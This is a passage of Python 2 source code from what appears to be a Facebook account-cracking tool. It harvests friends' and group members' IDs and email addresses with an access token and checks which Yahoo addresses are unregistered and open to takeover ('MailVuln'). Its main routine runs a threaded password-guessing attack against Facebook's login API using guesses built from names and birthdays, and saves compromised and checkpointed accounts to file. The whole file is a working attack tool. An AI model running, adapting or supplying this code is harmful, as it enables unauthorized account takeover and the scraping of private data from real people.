    go = raw_input('╚═\x1b[1;91m▶\x1b[1;97m ')
    if go == '':
        print '\x1b[1;91m[!] Can\'t empty'
        yahoo_pilih()
    else:
        if go == '1':
            yahoofriends()
        else:
            if go == '2':
                yahoolist()
            else:
                if go == '0':
                    menu_yahoochkx()
                else:
                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + go + ' \x1b[1;91mnot found'
                    yahoochkx_pilih()


def yahoofriends():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print "\033[1;97m «--------------------------------------------»"
    mpsh = []
    jml = 0
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
    friends = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
    kimak = json.loads(friends.text)
    save = open('MailVuln.txt', 'w')
    print "\033[1;97m «--------------------------------------------»"
    for w in kimak['data']:
        jml += 1
        mpsh.append(jml)
        id = w['id']
        nama = w['name']
        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
        z = json.loads(links.text)
        try:
            mail = z['email']
            yahoo = re.compile('@.*')
            otw = yahoo.search(mail).group()
            if 'yahoo.com' in otw:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr=0)
                br['username'] = mail
                klik = br.submit().read()
                jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    pek = jok.search(klik).group()
                except:
                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;92mEmail \x1b[1;91m:\x1b[1;91m ' + mail + ' \x1b[1;97m[\x1b[1;92m' + vulnot + '\x1b[1;97m]'
                    continue

                if '"messages.ERROR_INVALID_USERNAME">' in pek:
                    save.write(mail + '\n')
                    print "\033[1;97m «--------------------------------------------»"
                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName  \x1b[1;91m:\x1b[1;97m ' + nama
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mID    \x1b[1;91m:\x1b[1;97m ' + id
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mEmail \x1b[1;91m:\x1b[1;97m ' + mail + ' [\x1b[1;92m' + vuln + '\x1b[1;97m]'
                    print "\033[1;97m «--------------------------------------------»"
                else:
                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;92mEmail \x1b[1;91m:\x1b[1;91m ' + mail + ' \x1b[1;97m[\x1b[1;92m' + vulnot + '\x1b[1;97m]'
        except KeyError:
            pass

    print '\n\x1b[1;91m[+] \x1b[1;97mFinish'
    print '\x1b[1;91m[+] \x1b[1;97mSaved \x1b[1;91m:\x1b[1;97m MailVuln.txt'
    save.close()
    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
    menu_yahoo()


def yahoolist():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print "\033[1;97m «--------------------------------------------»"
        files = raw_input('\x1b[1;91m[+] \x1b[1;92mFile \x1b[1;91m: \x1b[1;97m')
        try:
            total = open(files, 'r')
            mail = total.readlines()
        except IOError:
            print '\x1b[1;91m[!] File not found'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu_yahoo()

    mpsh = []
    jml = 0
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
    save = open('MailVuln.txt', 'w')
    print "\033[1;97m «--------------------------------------------»"
    print '\x1b[1;91m[?] \x1b[1;97mStatus \x1b[1;91m:  \x1b[1;97mRed[\x1b[1;92m' + vulnot + '\x1b[1;97m]  Green[\x1b[1;92m' + vuln + '\x1b[1;97m]'
    print
    mail = open(files, 'r').readlines()
    for pw in mail:
        mail = pw.replace('\n', '')
        jml += 1
        mpsh.append(jml)
        yahoo = re.compile('@.*')
        otw = yahoo.search(mail).group()
        if 'yahoo.com' in otw:
            br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
            br._factory.is_html = True
            br.select_form(nr=0)
            br['username'] = mail
            klik = br.submit().read()
            jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
            try:
                pek = jok.search(klik).group()
            except:
                print '\x1b[1;91m ' + mail
                continue

            if '"messages.ERROR_INVALID_USERNAME">' in pek:
                save.write(mail + '\n')
                print '\x1b[1;92m ' + mail
            else:
                print '\x1b[1;91m ' + mail

    print '\n\x1b[1;91m[+] \x1b[1;97mFinish'
    print '\x1b[1;91m[+] \x1b[1;97mSaved \x1b[1;91m:\x1b[1;97m MailVuln.txt'
    save.close()
    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
    menu_yahoo()
   
def grouphackx():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print "\033[1;97m «--------------------------------------------»"
            id = raw_input('\x1b[1;91m[+] \x1b[1;92mID grup \x1b[1;91m:\x1b[1;97m ')
            try:
                r = requests.get('https://graph.facebook.com/group/?id=' + id + '&access_token=' + toket)
                asw = json.loads(r.text)
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName group \x1b[1;91m:\x1b[1;97m ' + asw['name']
            except KeyError:
                print '\x1b[1;91m[!] Group not found'
                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                grab()

            simg = raw_input('\x1b[1;91m[+] \x1b[1;97mSave File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            b = open(simg, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            print "\033[1;97m «--------------------------------------------»"
            re = requests.get('https://graph.facebook.com/' + id + '/members?fields=name,id&access_token=' + toket)
            s = json.loads(re.text)
            for i in s['data']:
                idmem.append(i['id'])
                b.write(i['id'] + '\n')
                print '\r\x1b[1;92mName\x1b[1;91m  :\x1b[1;97m ' + i['name']
                print '\x1b[1;92mID  \x1b[1;91m  :\x1b[1;97m ' + i['id']
                print "\033[1;97m «--------------------------------------------»"

            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal ID \x1b[1;96m%s' % len(idmem)
            print '\x1b[1;91m[+] \x1b[1;97mFile saved \x1b[1;91m: \x1b[1;97m' + simg
            b.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except IOError:
            print '\x1b[1;91m[!] Error when creating file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except KeyError:
            os.remove(simg)
            print '\x1b[1;91m[!] Group not found'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
            keluar()
           
def getemailx():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print "\033[1;97m «--------------------------------------------»"
            idt = raw_input('\x1b[1;91m[+] \x1b[1;92mInput ID Friends \x1b[1;91m: \x1b[1;97m')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom\x1b[1;91m :\x1b[1;97m ' + op['name']
            except KeyError:
                print '\x1b[1;91m[!] Not be friends'
                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                grab()

            mails = raw_input('\x1b[1;91m[+] \x1b[1;92mSave File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            a = json.loads(r.text)
            mpsh = open(mails, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            print "\033[1;97m «--------------------------------------------»"
            for i in a['data']:
                x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
                z = json.loads(x.text)
                try:
                    emfromfriends.append(z['email'])
                    mpsh.write(z['email'] + '\n')
                    print "\033[1;97m «--------------------------------------------»"
                    print '\r\x1b[1;92mName\x1b[1;91m  :\x1b[1;97m ' + z['name']
                    print '\x1b[1;92mEmail\x1b[1;91m : \x1b[1;97m' + z['email']
                    print "\033[1;97m «--------------------------------------------»"
                except KeyError:
                    pass

            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal Email\x1b[1;96m%s' % len(emfromfriends)
            print '\x1b[1;91m[+] \x1b[1;97mFile saved \x1b[1;91m: \x1b[1;97m' + mails
            mpsh.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except IOError:
            print '\x1b[1;91m[!] Error when creating file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
            keluar()
           
def getverifyx():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
        print "\033[1;96m «--------------------------------------------»"
        print( "\x1b[1;32;92m[1] \033[1;33;98m>> Crack From Public Verify ID \033[1;97m(\033[1;91mTech Abm\033[1;97m)") 
	time.sleep(0.05)
	print( "\x1b[1;32;36m[0] \033[1;33;96m>> Back") 
	print "\033[1;96m «--------------------------------------------»" 
	pilih_getverifyx()
   
def pilih_getverifyx():
	peak = raw_input("\n\033[1;31;40m>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_getverifyx()
        elif peak =="1":
		os.system('clear')
		print logo
		print "\033[1;97m «--------------------------------------------»"
		idt = raw_input("\033[1;96m[⊱⋕⊰]\033[1;93m Enter ID/USERNAME\033[1;91m : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;31;37m[⊱⋕⊰] Name : "+op["name"]
		except KeyError:
			print"\x1b[1;37m[⊱⋕⊰] ID Not Found!"
			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
			super()
		print"\033[1;35;37m[⊱⋕⊰] Getting ID Loading process........ "
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_super()

	print "\033[1;36;96m[⊱⋕⊰] Total IDs : \033[1;92m"+str(len(id))
	jalan('\033[1;34;96m[⊱⋕⊰] Please Wait ')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m  «-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
	print "\033[1;97m «--------------------------------------------»"
	jalan('   \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
        jalan(' \033[1;91m            Create By : Tech-Abm')
	print "\033[1;97m «--------------------------------------------»"

	def main(arg):
		global oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:Tech-abm
		try:													
			k = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			y = json.loads(k.text)
			pass1 = ('786786')
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			s = json.load(data)
			if 'access_token' in s:
				print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in s["error_msg"]:
					print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass1
					cek = open("out/checkpoint.txt", "k")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = a['birthday']
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					s = json.load(data)
					if 'access_token' in s:
						print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in s["error_msg"]:
							print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass2
							cek = open("out/checkpoint.txt", "k")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = y['first_name'] + '123'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							s = json.load(data)
							if 'access_token' in s:
								print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in s["error_msg"]:
									print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass3
									cek = open("out/checkpoint.txt", "k")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = y['first_name'] + '12345'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									s = json.load(data)
									if 'access_token' in s:
										print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in s["error_msg"]:
											print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass4
											cek = open("out/checkpoint.txt", "k")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = y['first_name'] + '786'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											s = json.load(data)
											if 'access_token' in s:
												print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in s["error_msg"]:
													print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass5
													cek = open("out/checkpoint.txt", "k")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = y['last_name'] + '123'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													s = json.load(data)
													if 'access_token' in s:
														print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\x1b[1;97m' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in s["error_msg"]:
															print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass6
															cek = open("out/checkpoint.txt", "k")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = y['last_name'] + '786'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															s = json.load(data)
															if 'access_token' in s:
																print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in s["error_msg"]:
																	print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass7
																	cek = open("out/checkpoint.txt", "k")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																												   	
											                               
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;97m «--------------------------------------------»"
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;96m[+] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/checkpoint.txt")
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	login()
	
if __name__ == '__main__':
	login()

	


